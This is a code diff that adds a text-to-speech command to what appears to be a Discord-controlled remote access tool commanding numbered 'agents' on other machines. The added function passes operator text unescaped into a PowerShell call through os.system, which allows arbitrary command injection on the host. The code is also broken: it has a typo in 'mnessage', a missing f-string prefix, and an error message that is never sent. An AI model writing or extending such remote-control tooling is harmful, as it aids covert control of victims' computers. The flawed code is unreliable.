@@ -539,6 +539,16 @@ async def killproc(context):
             my_embed = discord.Embed(title=f"Successfully killed process {word_list[1]} on Agent#{ID}", color=0x00FF00)
             await context.message.channel.send(embed=my_embed)
 
+@client.command(name='tts', pass_context=True)
+async def tts(context):
+    command = context.mnessage.content.replace("!tts ", "")
+    try:
+        os.system(f'''PowerShell -Command "Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{command}');"''')
+        my_embed = discord.Embed(title="Successfully sent the text-to-speech command on Agent#{ID}", color=0x00FF00)
+        await context.message.channel.send(embed=my_embed)
+    except Exception as e:
+        my_embed = discord.Embed(title=f"Error running text-to-speech command on Agent#{ID}:\n{e}", color=0xFF0000)
+
 @client.event
 async def on_ready():
     channel = client.get_channel(AGENT_ONLINE_ID)
